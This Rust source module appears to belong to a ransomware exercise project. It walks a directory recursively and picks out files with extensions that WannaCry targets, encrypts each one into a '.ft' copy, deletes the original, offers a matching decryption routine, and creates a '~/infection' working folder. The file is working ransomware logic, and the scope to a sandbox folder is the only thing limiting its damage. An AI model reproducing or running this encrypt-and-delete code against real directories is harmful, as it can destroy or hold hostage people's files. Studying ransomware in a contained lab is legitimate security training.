use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use crate::crypto;
use crate::extensions::is_wannacry_target;

const ENCRYPTED_EXT: &str = ".ft";

/// Collect all files inside `dir` that are WannaCry targets and don't already
/// have the `.ft` extension.
pub fn collect_encryptable(dir: &Path) -> io::Result<Vec<PathBuf>> {
    let mut targets = Vec::new();
    visit_dir(dir, &mut targets, true)?;
    Ok(targets)
}

/// Collect all `.ft` files inside `dir` (candidates for decryption).
pub fn collect_decryptable(dir: &Path) -> io::Result<Vec<PathBuf>> {
    let mut targets = Vec::new();
    visit_dir(dir, &mut targets, false)?;
    Ok(targets)
}

fn visit_dir(dir: &Path, out: &mut Vec<PathBuf>, encrypt_mode: bool) -> io::Result<()> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            visit_dir(&path, out, encrypt_mode)?;
        } else if path.is_file() {
            if encrypt_mode {
                // Must have a WannaCry target extension and not already be .ft
                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    if ext != "ft" && is_wannacry_target(&format!(".{}", ext)) {
                        out.push(path);
                    }
                }
            } else {
                // Decrypt mode: only pick up .ft files
                if path.extension().and_then(|e| e.to_str()) == Some("ft") {
                    out.push(path);
                }
            }
        }
    }
    Ok(())
}

/// Encrypt a single file in place:
/// 1. Read plaintext
/// 2. Encrypt
/// 3. Write to `<original_path>.ft`
/// 4. Remove the original
pub fn encrypt_file(path: &Path, key: &str) -> io::Result<PathBuf> {
    let plaintext = fs::read(path)?;
    let ciphertext = crypto::encrypt(&plaintext, key)?;

    // Build destination path: append .ft to the original filename
    let mut new_path = path.to_path_buf();
    let new_name = format!(
        "{}.ft",
        path.file_name()
            .and_then(|n| n.to_str())
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Invalid filename"))?
    );
    new_path.set_file_name(new_name);

    fs::write(&new_path, ciphertext)?;
    fs::remove_file(path)?;

    Ok(new_path)
}

/// Decrypt a single `.ft` file in place:
/// 1. Read ciphertext
/// 2. Decrypt
/// 3. Write plaintext to original filename (strip `.ft`)
/// 4. Remove the `.ft` file
pub fn decrypt_file(path: &Path, key: &str) -> io::Result<PathBuf> {
    let ciphertext = fs::read(path)?;
    let plaintext = crypto::decrypt(&ciphertext, key)?;

    // Strip the .ft extension to recover the original filename
    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Invalid filename"))?;

    let original_name = file_name
        .strip_suffix(".ft")
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "File does not have .ft extension"))?;

    let mut original_path = path.to_path_buf();
    original_path.set_file_name(original_name);

    fs::write(&original_path, plaintext)?;
    fs::remove_file(path)?;

    Ok(original_path)
}

/// Return the path to `~/infection`, creating it if it does not exist.
pub fn infection_dir() -> io::Result<PathBuf> {
    let home = std::env::var("HOME")
        .map(PathBuf::from)
        .or_else(|_| {
            // Fallback: use passwd entry
            std::env::var("USER").map(|_| PathBuf::from("/root"))
        })
        .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "Could not determine HOME directory"))?;

    let dir = home.join("infection");

    if !dir.exists() {
        fs::create_dir_all(&dir)?;
    }

    Ok(dir)
}